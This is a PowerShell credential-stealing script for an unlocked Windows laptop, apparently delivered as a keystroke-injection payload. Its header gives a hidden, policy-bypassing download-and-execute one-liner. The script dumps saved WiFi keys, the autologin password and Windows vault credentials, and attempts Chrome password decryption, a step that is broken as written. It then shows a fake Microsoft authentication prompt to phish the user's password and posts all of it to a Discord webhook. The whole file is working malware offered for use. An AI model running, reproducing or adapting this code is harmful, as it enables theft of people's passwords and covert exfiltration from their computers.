# Used to automate some fun stuff with an unlocked laptop.
# Tested on Windows 10 & Windows 11

# Some Globals
# The Discord sending webhook
# Example use: powershell -w h -ep bypass $discordwebhook='https://discord.com/whatever';irm https://raw.githubusercontent.com/NotAMaliciousHacker/MaliciousFlipperScripts/main/AllTheFun/AllTheFun.ps1 | iex

function Send-DiscordWebhook {
    param (
        [string]$WebhookUrl,
        [string]$Source,
        [string]$Message
    )

    # Create a hashtable for the body
    $body = @{
        content = "Source" + $Source + "\r\n" + "Value: " + $Message
    } | ConvertTo-Json

    # Set headers for the HTTP request
    $headers = @{
        "Content-Type" = "application/json"
    }

    # Send the POST request to the Discord webhook
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -Headers $headers
}

# First, grab all the WiFi Password

$wifiprofiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
if (-not ($wifiprofiles::IsNullOrEmpty)) {
    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Wifi" -Message $wifiprofiles
}

# Autologin password

$AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
If (($AutoLoginPassword).DefaultPassword) {
    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "AutoLogin" -Message $AutoLoginPassword
} 

# Windows Password Vault

$VaultPassword = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
If (-not ($VaultPassword::IsNullOrEmpty)) {
    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "Vault" -Message $VaultPassword
}

# Chrome Password

$ChromePassword = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
If (-not ($ChromePassword::IsNullOrEmpty)) {
    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "ChromeVault" -Message $ChromePassword
}

# Now that we send everything, do a nice prompt to the user to submit their password anyway :)
 
function Get-Creds {

    $form = $null

    while ($form -eq $null)
    {
        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
        $cred.getnetworkcredential().password

        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
        {
            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
            {
                Add-Type -AssemblyName PresentationCore,PresentationFramework
            }

            $msgBody = "Credentials cannot be empty!"
            $msgTitle = "Error"
            $msgButton = 'Ok'
            $msgImage = 'Stop'
            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
            Write-Host "The user clicked: $Result"
            $form = $null
        }
        
        else{
            $creds = $cred.GetNetworkCredential() | fl
            return $creds
        }
    }
}

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell
    
        while (1) {
            $pauseTime = 3
            if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
                break
            }
            else {
                $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
            }
        }
    }
    
function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    
    #If true, toggle CapsLock key, to ensure that the script doesn't fail
    if ($caps -eq $true){
    
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
    }
}

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"

$creds = Get-Creds

if (-not ($creds::IsNullOrEmpty)) {
    Send-DiscordWebhook -WebhookUrl $discordwebhook -Source "PasswordPrompt" -Message $creds
}





